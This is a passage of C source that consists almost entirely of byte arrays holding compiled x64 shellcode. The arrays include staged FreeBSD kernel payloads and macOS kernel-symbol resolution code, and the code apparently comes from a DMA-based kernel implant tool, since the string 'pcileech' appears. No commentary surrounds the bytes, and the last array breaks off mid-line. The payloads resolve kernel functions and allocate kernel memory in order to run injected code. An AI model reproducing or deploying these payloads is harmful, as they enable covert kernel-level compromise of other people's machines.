    0xef, 0x48, 0x8b, 0xc1, 0xc3, 0x41, 0x52, 0x57, 0x56, 0x48, 0x8b, 0xf9,
    0x48, 0x8b, 0xf2, 0xe8, 0xd5, 0xff, 0xff, 0xff, 0x4c, 0x8b, 0xc0, 0xe8,
    0x89, 0xff, 0xff, 0xff, 0x4c, 0x8b, 0xc8, 0x41, 0x8b, 0x40, 0x14, 0x4c,
    0x2b, 0xc8, 0x4d, 0x8b, 0xd1, 0x41, 0x8b, 0x48, 0x0c, 0x49, 0x83, 0xe9,
    0x10, 0x49, 0x8b, 0x41, 0x08, 0x48, 0xc1, 0xe8, 0x20, 0x83, 0xf8, 0x80,
    0x75, 0x11, 0x41, 0x8b, 0x39, 0x49, 0x03, 0xfa, 0xe8, 0x3d, 0xff, 0xff,
    0xff, 0x48, 0x83, 0xf8, 0x00, 0x74, 0x0a, 0xe2, 0xdc, 0x48, 0x33, 0xc0,
    0x5e, 0x5f, 0x41, 0x5a, 0xc3, 0x49, 0x8b, 0x41, 0x08, 0x5e, 0x5f, 0x41,
    0x5a, 0xc3, 0x41, 0x57, 0x41, 0x56, 0x41, 0x55, 0x4c, 0x8b, 0xf9, 0x4c,
    0x8b, 0xf2, 0x49, 0xc7, 0xc5, 0x58, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x05,
    0x7f, 0x00, 0x00, 0x00, 0x50, 0x48, 0x8d, 0x05, 0x83, 0x00, 0x00, 0x00,
    0x50, 0x48, 0x8d, 0x05, 0x85, 0x00, 0x00, 0x00, 0x50, 0x48, 0x8d, 0x05,
    0x85, 0x00, 0x00, 0x00, 0x50, 0x48, 0x8d, 0x05, 0x8f, 0x00, 0x00, 0x00,
    0x50, 0x48, 0x8d, 0x05, 0x91, 0x00, 0x00, 0x00, 0x50, 0x48, 0x8d, 0x05,
    0x9d, 0x00, 0x00, 0x00, 0x50, 0x48, 0x8d, 0x05, 0x9e, 0x00, 0x00, 0x00,
    0x50, 0x48, 0x8d, 0x05, 0x9e, 0x00, 0x00, 0x00, 0x50, 0x48, 0x8d, 0x05,
    0x9e, 0x00, 0x00, 0x00, 0x50, 0x48, 0x8d, 0x05, 0x9e, 0x00, 0x00, 0x00,
    0x50, 0x49, 0x83, 0xed, 0x08, 0x49, 0x8b, 0xcf, 0x5a, 0xe8, 0x2b, 0xff,
    0xff, 0xff, 0x48, 0x85, 0xc0, 0x74, 0x18, 0x4b, 0x89, 0x44, 0x35, 0x00,
    0x4d, 0x85, 0xed, 0x75, 0xe4, 0x41, 0x5d, 0x41, 0x5e, 0x41, 0x5f, 0x48,
    0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00, 0xc3, 0x48, 0x33, 0xc0, 0xc3, 0x5f,
    0x6b, 0x65, 0x72, 0x6e, 0x65, 0x6c, 0x5f, 0x6d, 0x61, 0x70, 0x00, 0x5f,
    0x50, 0x45, 0x5f, 0x73, 0x74, 0x61, 0x74, 0x65, 0x00, 0x5f, 0x49, 0x4f,
    0x46, 0x72, 0x65, 0x65, 0x00, 0x5f, 0x49, 0x4f, 0x46, 0x72, 0x65, 0x65,
    0x43, 0x6f, 0x6e, 0x74, 0x69, 0x67, 0x75, 0x6f, 0x75, 0x73, 0x00, 0x5f,
    0x49, 0x4f, 0x4d, 0x61, 0x6c, 0x6c, 0x6f, 0x63, 0x00, 0x5f, 0x49, 0x4f,
    0x4d, 0x61, 0x6c, 0x6c, 0x6f, 0x63, 0x43, 0x6f, 0x6e, 0x74, 0x69, 0x67,
    0x75, 0x6f, 0x75, 0x73, 0x00, 0x5f, 0x49, 0x4f, 0x53, 0x6c, 0x65, 0x65,
    0x70, 0x00, 0x5f, 0x6d, 0x65, 0x6d, 0x63, 0x6d, 0x70, 0x00, 0x5f, 0x6d,
    0x65, 0x6d, 0x63, 0x70, 0x79, 0x00, 0x5f, 0x6d, 0x65, 0x6d, 0x73, 0x65,
    0x74, 0x00, 0x5f, 0x76, 0x6d, 0x5f, 0x70, 0x72, 0x6f, 0x74, 0x65, 0x63,
    0x74, 0x00, 0x48, 0x8b, 0xc1, 0x57, 0x56, 0x48, 0x8b, 0xfa, 0x49, 0x8b,
    0xf0, 0x49, 0x8b, 0xd1, 0x48, 0x8b, 0x4c, 0x24, 0x38, 0x4c, 0x8b, 0x44,
    0x24, 0x40, 0x4c, 0x8b, 0x4c, 0x24, 0x48, 0x41, 0x57, 0x4c, 0x8b, 0xfc,
    0x48, 0x83, 0xe4, 0xf0, 0x48, 0x83, 0xec, 0x20, 0xff, 0xd0, 0x49, 0x8b,
    0xe7, 0x41, 0x5f, 0x5e, 0x5f, 0xc3, 0x0f, 0x20, 0xd8, 0x0f, 0x22, 0xd8,
    0xc3, 0x0f, 0x20, 0xd8, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x8b, 0xc4, 0x48,
    0x89, 0x58, 0x08, 0x48, 0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48,
    0x89, 0x78, 0x20, 0x41, 0x56, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0x81,
    0x08, 0x03, 0x00, 0x00, 0x4d, 0x8b, 0xf0, 0x48, 0x8b, 0x89, 0x48, 0x03,
    0x00, 0x00, 0x41, 0xb9, 0x00, 0x10, 0x00, 0x00, 0x45, 0x33, 0xc0, 0x48,
    0x8b, 0xea, 0x33, 0xdb, 0x33, 0xff, 0x48, 0x8b, 0xb0, 0xa0, 0x00, 0x00,
    0x00, 0xe8, 0x78, 0xff, 0xff, 0xff, 0x39, 0x9e, 0x0c, 0x04, 0x00, 0x00,
    0x0f, 0x86, 0x83, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x55, 0xf8, 0x44, 0x8b,
    0x86, 0x08, 0x04, 0x00, 0x00, 0x48, 0xb9, 0x00, 0x00, 0x00, 0x00, 0x80,
    0xff, 0xff, 0xff, 0x4c, 0x03, 0xc1, 0x41, 0x8b, 0x04, 0x38, 0x83, 0xf8,
    0x0d, 0x77, 0x4e, 0xb9, 0xfe, 0x26, 0x00, 0x00, 0x0f, 0xa3, 0xc1, 0x73,
    0x44, 0x48, 0x85, 0xdb, 0x74, 0x22, 0x4c, 0x8b, 0x0a, 0x48, 0x8b, 0x4a,
    0xf8, 0x49, 0x03, 0xc9, 0x49, 0x39, 0x4c, 0x38, 0x08, 0x75, 0x11, 0x49,
    0x8b, 0x44, 0x38, 0x18, 0x48, 0xc1, 0xe0, 0x0c, 0x49, 0x03, 0xc1, 0x48,
    0x89, 0x02, 0xeb, 0x1d, 0x49, 0x8b, 0x44, 0x38, 0x08, 0x48, 0xff, 0xc3,
    0x48, 0x89, 0x42, 0x08, 0x49, 0x8b, 0x44, 0x38, 0x18, 0x48, 0xc1, 0xe0,
    0x0c, 0x48, 0x89, 0x42, 0x10, 0x48, 0x83, 0xc2, 0x10, 0x8b, 0x8e, 0x10,
    0x04, 0x00, 0x00, 0x48, 0x03, 0xf9, 0x8b, 0x8e, 0x0c, 0x04, 0x00, 0x00,
    0x48, 0x3b, 0xf9, 0x72, 0x81, 0x48, 0x8b, 0x6c, 0x24, 0x38, 0xb8, 0x01,
    0x00, 0x00, 0x00, 0x48, 0x8b, 0x74, 0x24, 0x40, 0x48, 0x8b, 0x7c, 0x24,
    0x48, 0x48, 0xc1, 0xe3, 0x04, 0x49, 0x89, 0x1e, 0x48, 0x8b, 0x5c, 0x24,
    0x30, 0x48, 0x83, 0xc4, 0x20, 0x41, 0x5e, 0xc3, 0x40, 0x53, 0x55, 0x56,
    0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x48, 0x83, 0xec, 0x30, 0x48,
    0x8d, 0xb1, 0x00, 0x03, 0x00, 0x00, 0x48, 0xc7, 0x41, 0x50, 0x04, 0x00,
    0x00, 0x00, 0x48, 0xb8, 0x77, 0x33, 0x33, 0x11, 0x77, 0x33, 0x11, 0xff,
    0x48, 0x8b, 0xd9, 0x48, 0x89, 0x01, 0x48, 0x8b, 0xd6, 0x48, 0x8b, 0x49,
    0x08, 0x33, 0xed, 0xe8, 0x72, 0xfd, 0xff, 0xff, 0x85, 0xc0, 0x75, 0x0a,
    0xb8, 0x01, 0x00, 0x00, 0xf0, 0xe9, 0x56, 0x03, 0x00, 0x00, 0x48, 0x8b,
    0x8b, 0x28, 0x03, 0x00, 0x00, 0x4c, 0x8d, 0x4c, 0x24, 0x78, 0x41, 0xbd,
    0x00, 0x00, 0x00, 0x01, 0x41, 0xbc, 0x0c, 0x00, 0x00, 0x00, 0x45, 0x8b,
    0xc4, 0x4c, 0x89, 0x6b, 0x18, 0x41, 0x8b, 0xd5, 0xe8, 0x51, 0xfe, 0xff,
    0xff, 0x48, 0x8b, 0xf8, 0x48, 0x85, 0xc0, 0x75, 0x35, 0x48, 0x8b, 0x8b,
    0x28, 0x03, 0x00, 0x00, 0x4c, 0x8d, 0x4c, 0x24, 0x78, 0xb8, 0x00, 0x00,
    0x40, 0x00, 0x45, 0x8b, 0xc4, 0x8b, 0xd0, 0x48, 0x89, 0x43, 0x18, 0xe8,
    0x2a, 0xfe, 0xff, 0xff, 0x48, 0x8b, 0xf8, 0x48, 0x85, 0xc0, 0x75, 0x0e,
    0x48, 0x21, 0x6b, 0x18, 0xb8, 0x02, 0x00, 0x00, 0xf0, 0xe9, 0xf2, 0x02,
    0x00, 0x00, 0x48, 0x8b, 0x4c, 0x24, 0x78, 0x48, 0x85, 0xc9, 0x0f, 0x84,
    0xdf, 0x02, 0x00, 0x00, 0x4c, 0x8b, 0x4b, 0x18, 0x48, 0xb8, 0x00, 0x00,
    0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x49, 0x2b, 0xc1, 0x48, 0x3b, 0xc8,
    0x0f, 0x87, 0xc5, 0x02, 0x00, 0x00, 0x48, 0x8b, 0x16, 0x4c, 0x8b, 0xc7,
    0x48, 0x89, 0x4b, 0x20, 0x48, 0x8b, 0x8b, 0x50, 0x03, 0x00, 0x00, 0x48,
    0x89, 0x7b, 0x28, 0x48, 0x8b, 0x12, 0xc7, 0x44, 0x24, 0x28, 0x07, 0x00,
    0x00, 0x00, 0x48, 0x21, 0x6c, 0x24, 0x20, 0xe8, 0xc2, 0xfd, 0xff, 0xff,
    0xe8, 0xf8, 0xfd, 0xff, 0xff, 0x48, 0x8b, 0x8b, 0x28, 0x03, 0x00, 0x00,
    0x4c, 0x8d, 0x4c, 0x24, 0x70, 0x45, 0x8b, 0xc4, 0x4c, 0x8b, 0xf0, 0x41,
    0xbc, 0x00, 0xa0, 0x00, 0x00, 0x41, 0x8b, 0xd4, 0xe8, 0x9d, 0xfd, 0xff,
    0xff, 0x48, 0x8b, 0xf0, 0x48, 0x85, 0xc0, 0x0f, 0x84, 0x63, 0x02, 0x00,
    0x00, 0x48, 0xa9, 0xff, 0x0f, 0x00, 0x00, 0x0f, 0x85, 0x57, 0x02, 0x00,
    0x00, 0x48, 0x8b, 0x8b, 0x48, 0x03, 0x00, 0x00, 0x45, 0x8b, 0xcc, 0x45,
    0x33, 0xc0, 0x48, 0x8b, 0xd0, 0xe8, 0x70, 0xfd, 0xff, 0xff, 0xba, 0x00,
    0x20, 0x00, 0x00, 0x4c, 0x8d, 0x86, 0x00, 0x10, 0x00, 0x00, 0x48, 0x8b,
    0x4c, 0x24, 0x70, 0x48, 0x03, 0xca, 0x48, 0x81, 0xc2, 0x00, 0x10, 0x00,
    0x00, 0x48, 0x83, 0xc9, 0x23, 0x49, 0x89, 0x08, 0x4d, 0x8d, 0x40, 0x08,
    0x49, 0x3b, 0xd4, 0x72, 0xe1, 0x48, 0x8b, 0x44, 0x24, 0x70, 0x48, 0xb9,
    0xe8, 0x0e, 0x00, 0x00, 0x80, 0xff, 0xff, 0xff, 0x48, 0x05, 0x00, 0x10,
    0x00, 0x00, 0x41, 0xbc, 0x01, 0x00, 0x00, 0x00, 0x48, 0x83, 0xc8, 0x23,
    0x48, 0x89, 0x06, 0xb8, 0x00, 0xf0, 0xff, 0xff, 0x4c, 0x23, 0xf0, 0x48,
    0x8b, 0x44, 0x24, 0x70, 0x48, 0x83, 0xc8, 0x23, 0x4c, 0x89, 0xb4, 0x24,
    0x80, 0x00, 0x00, 0x00, 0x49, 0x89, 0x04, 0x0e, 0x49, 0xbe, 0x00, 0x00,
    0x00, 0x00, 0x80, 0x11, 0x00, 0x00, 0x48, 0x89, 0x73, 0x58, 0x48, 0x8b,
    0x83, 0xf8, 0x0f, 0x00, 0x00, 0x4c, 0x89, 0x63, 0x30, 0x48, 0x85, 0xc0,
    0x75, 0x25, 0x49, 0x03, 0xec, 0x48, 0xb8, 0x00, 0xe4, 0x0b, 0x54, 0x02,
    0x00, 0x00, 0x00, 0x48, 0x3b, 0xe8, 0x76, 0xde, 0x48, 0x8b, 0x8b, 0x30,
    0x03, 0x00, 0x00, 0xba, 0x64, 0x00, 0x00, 0x00, 0xe8, 0xc5, 0xfc, 0xff,
    0xff, 0xeb, 0xcb, 0x48, 0xc7, 0x43, 0x30, 0x02, 0x00, 0x00, 0x00, 0x48,
    0x83, 0xf8, 0x03, 0x0f, 0x84, 0x20, 0x01, 0x00, 0x00, 0x48, 0x83, 0xf8,
    0x04, 0x75, 0x17, 0x48, 0x8b, 0x53, 0x28, 0x4c, 0x8d, 0x43, 0x48, 0x48,
    0x8b, 0xcb, 0xe8, 0xdd, 0xfc, 0xff, 0xff, 0x48, 0x63, 0xc8, 0x48, 0x89,
    0x4b, 0x38, 0x48, 0x83, 0xbb, 0xf8, 0x0f, 0x00, 0x00, 0x05, 0x75, 0x17,
    0x4c, 0x8d, 0x83, 0x20, 0x02, 0x00, 0x00, 0x48, 0x8b, 0xcb, 0x48, 0x8d,
    0x93, 0x20, 0x01, 0x00, 0x00, 0xff, 0xd7, 0x4c, 0x89, 0x63, 0x38, 0x48,
    0x8b, 0x83, 0xf8, 0x0f, 0x00, 0x00, 0x49, 0x2b, 0xc4, 0x49, 0x3b, 0xc4,
    0x77, 0x7a, 0x33, 0xc9, 0x48, 0x8d, 0x96, 0x00, 0x20, 0x00, 0x00, 0x48,
    0x8b, 0x43, 0x40, 0x49, 0xb8, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x80, 0x48, 0x25, 0x00, 0xf0, 0xff, 0xff, 0x48, 0x03, 0xc1, 0x48, 0x81,
    0xc1, 0x00, 0x10, 0x00, 0x00, 0x49, 0x0b, 0xc0, 0x48, 0x89, 0x02, 0x48,
    0x8d, 0x52, 0x08, 0x49, 0x3b, 0xcd, 0x72, 0xd3, 0xe8, 0x5d, 0xfc, 0xff,
    0xff, 0x4c, 0x8b, 0x4b, 0x48, 0x48, 0x8b, 0x8b, 0x40, 0x03, 0x00, 0x00,
    0x4c, 0x39, 0xa3, 0xf8, 0x0f, 0x00, 0x00, 0x75, 0x13, 0x44, 0x8b, 0x43,
    0x40, 0x48, 0x8b, 0xd7, 0x41, 0x81, 0xe0, 0xff, 0x0f, 0x00, 0x00, 0x4d,
    0x2b, 0xc6, 0xeb, 0x0f, 0x8b, 0x53, 0x40, 0x4c, 0x8b, 0xc7, 0x81, 0xe2,
    0xff, 0x0f, 0x00, 0x00, 0x49, 0x2b, 0xd6, 0xe8, 0xee, 0xfb, 0xff, 0xff,
    0x4c, 0x89, 0x63, 0x38, 0x48, 0x83, 0xbb, 0xf8, 0x0f, 0x00, 0x00, 0x06,
    0x75, 0x1b, 0x4c, 0x8b, 0x4b, 0x48, 0x48, 0x8b, 0xd7, 0x4c, 0x8b, 0x43,
    0x40, 0x48, 0x8b, 0x8b, 0x40, 0x03, 0x00, 0x00, 0xe8, 0xc9, 0xfb, 0xff,
    0xff, 0x4c, 0x89, 0x63, 0x38, 0x48, 0x83, 0xbb, 0xf8, 0x0f, 0x00, 0x00,
    0x07, 0x75, 0x1b, 0x4c, 0x8b, 0x4b, 0x48, 0x4c, 0x8b, 0xc7, 0x48, 0x8b,
    0x53, 0x40, 0x48, 0x8b, 0x8b, 0x40, 0x03, 0x00, 0x00, 0xe8, 0xa4, 0xfb,
    0xff, 0xff, 0x4c, 0x89, 0x63, 0x38, 0x48, 0x83, 0xa3, 0xf8, 0x0f, 0x00,
    0x00, 0x00, 0x33, 0xed, 0xe9, 0x99, 0xfe, 0xff, 0xff, 0x48, 0x8b, 0x8b,
    0x18, 0x03, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0xf0, 0x45, 0x8b, 0xc5,
    0x48, 0x89, 0x43, 0x30, 0x48, 0x8b, 0xd7, 0xe8, 0x76, 0xfb, 0xff, 0xff,
    0x48, 0x83, 0x63, 0x20, 0x00, 0x48, 0xb8, 0xe8, 0x0e, 0x00, 0x00, 0x80,
    0xff, 0xff, 0xff, 0x48, 0x83, 0x63, 0x28, 0x00, 0x41, 0xb8, 0x00, 0xa0,
    0x00, 0x00, 0x4c, 0x8b, 0xb4, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0x8b,
    0xd6, 0x49, 0x83, 0x24, 0x06, 0x00, 0x48, 0x8b, 0x8b, 0x18, 0x03, 0x00,
    0x00, 0xe8, 0x40, 0xfb, 0xff, 0xff, 0x48, 0x83, 0x23, 0x00, 0x48, 0x83,
    0xa3, 0xf8, 0x0f, 0x00, 0x00, 0x00, 0x4c, 0x89, 0x63, 0x38, 0xeb, 0x10,
    0xb8, 0x04, 0x00, 0x00, 0xf0, 0xeb, 0x05, 0xb8, 0x03, 0x00, 0x00, 0xf0,
    0x48, 0x89, 0x43, 0x30, 0x48, 0x83, 0xc4, 0x30, 0x41, 0x5e, 0x41, 0x5d,
    0x41, 0x5c, 0x5f, 0x5e, 0x5d, 0x5b, 0xc3
};

const BYTE FREEBSD_X64_STAGE1_BIN[] = {
    0xe8, 0xfb, 0xff, 0xff, 0xff
};

const BYTE FREEBSD_X64_STAGE2_BIN[] = {
    0xeb, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x58, 0x48, 0x83, 0xe8,
    0x05, 0x50, 0x57, 0x56, 0x52, 0x51, 0x41, 0x50, 0x41, 0x51, 0x41, 0x54,
    0x41, 0x55, 0x41, 0x56, 0x48, 0x8b, 0x15, 0xd9, 0xff, 0xff, 0xff, 0x48,
    0x89, 0x10, 0xb0, 0x00, 0xb2, 0x01, 0x48, 0x8d, 0x0d, 0xc5, 0xff, 0xff,
    0xff, 0xf0, 0x0f, 0xb0, 0x11, 0x75, 0x15, 0x8b, 0x05, 0xc7, 0xff, 0xff,
    0xff, 0x4c, 0x8d, 0x35, 0xb0, 0xff, 0xff, 0xff, 0x4c, 0x03, 0xf0, 0xe8,
    0x0f, 0x00, 0x00, 0x00, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x41, 0x59,
    0x41, 0x58, 0x59, 0x5a, 0x5e, 0x5f, 0xc3, 0x48, 0x8d, 0x3d, 0xeb, 0x00,
    0x00, 0x00, 0xe8, 0x8f, 0x00, 0x00, 0x00, 0x4d, 0x33, 0xc0, 0xb9, 0x00,
    0x10, 0x00, 0x00, 0xba, 0x00, 0x00, 0x00, 0x80, 0x48, 0x33, 0xf6, 0xbf,
    0x02, 0x00, 0x00, 0x00, 0xff, 0xd0, 0x4c, 0x8b, 0x68, 0x30, 0x49, 0xbc,
    0x00, 0x00, 0x00, 0x00, 0x00, 0xf8, 0xff, 0xff, 0x4d, 0x03, 0xe5, 0x49,
    0x8b, 0xfc, 0xe8, 0xa9, 0x00, 0x00, 0x00, 0x48, 0xb8, 0x48, 0x8d, 0x05,
    0xf1, 0xff, 0xff, 0xff, 0x48, 0x49, 0x89, 0x84, 0x24, 0x00, 0x10, 0x00,
    0x00, 0x48, 0xb8, 0x8b, 0x00, 0x48, 0x83, 0xf8, 0x00, 0x74, 0xf0, 0x49,
    0x89, 0x84, 0x24, 0x08, 0x10, 0x00, 0x00, 0x48, 0x8d, 0x3d, 0xa0, 0x00,
    0x00, 0x00, 0xe8, 0x2f, 0x00, 0x00, 0x00, 0x6a, 0x00, 0xbf, 0x00, 0x10,
    0x00, 0x00, 0x49, 0x03, 0xfc, 0x57, 0x48, 0x8d, 0x3d, 0x97, 0x00, 0x00,
    0x00, 0x57, 0x48, 0x8b, 0xfc, 0xff, 0xd0, 0x58, 0x58, 0x58, 0x4d, 0x89,
    0x74, 0x24, 0x58, 0x44, 0x89, 0x2d, 0x0a, 0xff, 0xff, 0xff, 0xc6, 0x05,
    0x02, 0xff, 0xff, 0xff, 0x66, 0xc3, 0x49, 0x8b, 0xce, 0x48, 0x83, 0xe9,
    0x08, 0x48, 0x83, 0xe9, 0x18, 0x48, 0x8b, 0x01, 0x48, 0x85, 0xc0, 0x74,
    0x14, 0x8b, 0x31, 0x49, 0x03, 0xf6, 0xe8, 0x0e, 0x00, 0x00, 0x00, 0x48,
    0x85, 0xc0, 0x75, 0xe5, 0x48, 0x8b, 0x41, 0x08, 0xc3, 0x48, 0x33, 0xc0,
    0xc3, 0x51, 0x48, 0x33, 0xc9, 0x48, 0xff, 0xc9, 0x48, 0xff, 0xc1, 0x8a,
    0x04, 0x39, 0x3a, 0x04, 0x31, 0x75, 0x09, 0x3c, 0x00, 0x75, 0xf1, 0x48,
    0x33, 0xc0, 0x59, 0xc3, 0xb0, 0x01, 0x59, 0xc3, 0x48, 0x33, 0xc0, 0xb9,
    0x00, 0x04, 0x00, 0x00, 0xfc, 0xf3, 0x48, 0xab, 0xc3, 0x76, 0x6d, 0x5f,
    0x70, 0x68, 0x79, 0x73, 0x5f, 0x61, 0x6c, 0x6c, 0x6f, 0x63, 0x5f, 0x63,
    0x6f, 0x6e, 0x74, 0x69, 0x67, 0x00, 0x6b, 0x74, 0x68, 0x72, 0x65, 0x61,
    0x64, 0x5f, 0x73, 0x74, 0x61, 0x72, 0x74, 0x00, 0x70, 0x63, 0x69, 0x6c,
    0x65, 0x65, 0x63, 0x68, 0x00
};

const BYTE FREEBSD_X64_STAGE3_BIN[] = {
    0x48, 0x8d, 0x05, 0xf1, 0xff, 0xff, 0xff, 0x48, 0x8b, 0x00, 0x48, 0x83,
    0xf8, 0x00, 0x74, 0xf0, 0x48, 0x8d, 0x0d, 0xe9, 0xef, 0xff, 0xff, 0xc8,
    0x20, 0x00, 0x00, 0xe8, 0xd0, 0x01, 0x00, 0x00, 0xc9, 0xc3, 0x51, 0x48,
    0x33, 0xc9, 0x48, 0xff, 0xc9, 0x48, 0xff, 0xc1, 0x8a, 0x04, 0x39, 0x3a,
    0x04, 0x31, 0x75, 0x09, 0x3c, 0x00, 0x75, 0xf1, 0x48, 0x33, 0xc0, 0x59,
    0xc3, 0xb0, 0x01, 0x59, 0xc3, 0x57, 0x56, 0x48, 0x8b, 0xfa, 0x48, 0x8b,
    0x49, 0x58, 0x48, 0x8b, 0xd1, 0x48, 0x83, 0xe9, 0x08, 0x48, 0x83, 0xe9,
    0x18, 0x48, 0x8b, 0x01, 0x48, 0x85, 0xc0, 0x74, 0x16, 0x8b, 0x31, 0x48,
    0x03, 0xf2, 0xe8, 0xbb, 0xff, 0xff, 0xff, 0x48, 0x85, 0xc0, 0x75, 0xe5,
    0x48, 0x8b, 0x41, 0x08, 0x5e, 0x5f, 0xc3, 0x48, 0x33, 0xc0, 0x5e, 0x5f,
    0xc3, 0x41, 0x57, 0x41, 0x56, 0x41, 0x55, 0x41, 0x54, 0x4c, 0x8b, 0xe4,
    0x4c, 0x8b, 0xf9, 0x4c, 0x8b, 0xf2, 0x49, 0xc7, 0xc5, 0x38, 0x00, 0x00,
    0x00, 0x48, 0x8d, 0x05, 0x65, 0x00, 0x00, 0x00, 0x50, 0x48, 0x8d, 0x05,
    0x68, 0x00, 0x00, 0x00, 0x50, 0x48, 0x8d, 0x05, 0x6d, 0x00, 0x00, 0x00,
    0x50, 0x48, 0x8d, 0x05, 0x6c, 0x00, 0x00, 0x00, 0x50, 0x48, 0x8d, 0x05,
    0x6b, 0x00, 0x00, 0x00, 0x50, 0x48, 0x8d, 0x05, 0x6d, 0x00, 0x00, 0x00,
    0x50, 0x48, 0x8d, 0x05, 0x7a, 0x00, 0x00, 0x00, 0x50, 0x49, 0x83, 0xed,
    0x08, 0x49, 0x8b, 0xcf, 0x5a, 0xe8, 0x6b, 0xff, 0xff, 0xff, 0x48, 0x85,
    0xc0, 0x74, 0x13, 0x4b, 0x89, 0x44, 0x35, 0x00, 0x4d, 0x85, 0xed, 0x75,
    0xe4, 0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00, 0xeb, 0x03, 0x48, 0x33,
    0xc0, 0x49, 0x8b, 0xe4, 0x41, 0x5c, 0x41, 0x5d, 0x41, 0x5e, 0x41, 0x5f,
    0xc3, 0x64, 0x75, 0x6d, 0x70, 0x5f, 0x61, 0x76, 0x61, 0x69, 0x6c, 0x00,
    0x6b, 0x74, 0x68, 0x72, 0x65, 0x61, 0x64, 0x5f, 0x65, 0x78, 0x69, 0x74,
    0x00, 0x6d, 0x65, 0x6d, 0x63, 0x70, 0x79, 0x00, 0x6d, 0x65, 0x6d, 0x73,
    0x65, 0x74, 0x00, 0x70, 0x61, 0x75, 0x73, 0x65, 0x5f, 0x73, 0x62, 0x74,
    0x00, 0x76, 0x6d, 0x5f, 0x70, 0x68, 0x79, 0x73, 0x5f, 0x61, 0x6c, 0x6c,
    0x6f, 0x63, 0x5f, 0x63, 0x6f, 0x6e, 0x74, 0x69, 0x67, 0x00, 0x76, 0x6d,
    0x5f, 0x70, 0x68, 0x79, 0x73, 0x5f, 0x66, 0x72, 0x65, 0x65, 0x5f, 0x63,
    0x6f, 0x6e, 0x74, 0x69, 0x67, 0x00, 0x48, 0x8b, 0xc1, 0x57, 0x56, 0x41,
    0x56, 0x41, 0x57, 0x48, 0x8b, 0xfa, 0x49, 0x8b, 0xf0, 0x49, 0x8b, 0xd1,
    0x48, 0x8b, 0x4c, 0x24, 0x48, 0x4c, 0x8b, 0x44, 0x24, 0x50, 0x4c, 0x8b,
    0x4c, 0x24, 0x58, 0x4c, 0x8b, 0xfc, 0x4c, 0x8b, 0x74, 0x24, 0x78, 0x41,
    0x56, 0x4c, 0x8b, 0x74, 0x24, 0x78, 0x41, 0x56, 0x4c, 0x8b, 0x74, 0x24,
    0x78, 0x41, 0x56, 0x4c, 0x8b, 0x74, 0x24, 0x78, 0x41, 0x56, 0xff, 0xd0,
    0x49, 0x8b, 0xe7, 0x41, 0x5f, 0x41, 0x5e, 0x5e, 0x5f, 0xc3, 0xcc, 0xcc,
    0x4c, 0x8b, 0x51, 0x28, 0x45, 0x33, 0xc0, 0x48, 0x8b, 0x91, 0x00, 0x03,
    0x00, 0x00, 0x4c, 0x8b, 0xc9, 0x4c, 0x2b, 0xd2, 0x48, 0x8b, 0x02, 0x48,
    0x85, 0xc0, 0x75, 0x06, 0x48, 0x39, 0x42, 0x08, 0x74, 0x19, 0x49, 0x89,
    0x04, 0x12, 0x49, 0xff, 0xc0, 0x48, 0x8b, 0x4a, 0x08, 0x48, 0x2b, 0x0a,
    0x49, 0x89, 0x4c, 0x12, 0x08, 0x48, 0x83, 0xc2, 0x10, 0xeb, 0xd9, 0x49,
    0xc1, 0xe0, 0x04, 0xb8, 0x01, 0x00, 0x00, 0x00, 0x4d, 0x89, 0x41, 0x48,
    0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x08, 0x48, 0x89, 0x74,
    0x24, 0x10, 0x48, 0x89, 0x7c, 0x24, 0x18, 0x41, 0x54, 0x41, 0x56, 0x41,
    0x57, 0x48, 0x83, 0xec, 0x30, 0x48, 0xb8, 0x77, 0x33, 0x33, 0x11, 0x77,
    0x33, 0x11, 0xff, 0x48, 0xc7, 0x41, 0x50, 0x08, 0x00, 0x00, 0x00, 0x48,
    0x8d, 0x91, 0x00, 0x03, 0x00, 0x00, 0x48, 0x89, 0x01, 0x48, 0x8b, 0xd9,
    0x33, 0xff, 0xe8, 0x4a, 0xfe, 0xff, 0xff, 0x85, 0xc0, 0x75, 0x0e, 0xb8,
    0x01, 0x00, 0x00, 0xf0, 0x48, 0x89, 0x43, 0x30, 0xe9, 0x0e, 0x02, 0x00,
    0x00, 0x48, 0x21, 0x7c, 0x24, 0x28, 0x41, 0xbe, 0x00, 0x10, 0x00, 0x00,
    0x48, 0x8b, 0x8b, 0x28, 0x03, 0x00, 0x00, 0x41, 0xbf, 0x00, 0x00, 0x00,
    0xf0, 0x45, 0x8b, 0xcf, 0x48, 0xc7, 0x43, 0x18, 0x00, 0x00, 0x00, 0x01,
    0x41, 0x8b, 0xd6, 0x44, 0x89, 0x74, 0x24, 0x20, 0x45, 0x33, 0xc0, 0xe8,
    0xe2, 0xfe, 0xff, 0xff, 0x48, 0x8b, 0xf0, 0x48, 0x85, 0xc0, 0x75, 0x34,
    0x48, 0x21, 0x7c, 0x24, 0x28, 0x45, 0x8b, 0xcf, 0x48, 0x8b, 0x8b, 0x28,
    0x03, 0x00, 0x00, 0x45, 0x33, 0xc0, 0xba, 0x00, 0x04, 0x00, 0x00, 0x44,
    0x89, 0x74, 0x24, 0x20, 0x48, 0xc7, 0x43, 0x18, 0x00, 0x00, 0x40, 0x00,
    0xe8, 0xb1, 0xfe, 0xff, 0xff, 0x48, 0x21, 0x7b, 0x18, 0xb8, 0x02, 0x00,
    0x00, 0xf0, 0xeb, 0x88, 0x48, 0x8b, 0x40, 0x30, 0x49, 0xbc, 0x00, 0x00,
    0x00, 0x00, 0x00, 0xf8, 0xff, 0xff, 0x48, 0x89, 0x43, 0x20, 0x41, 0xbe,
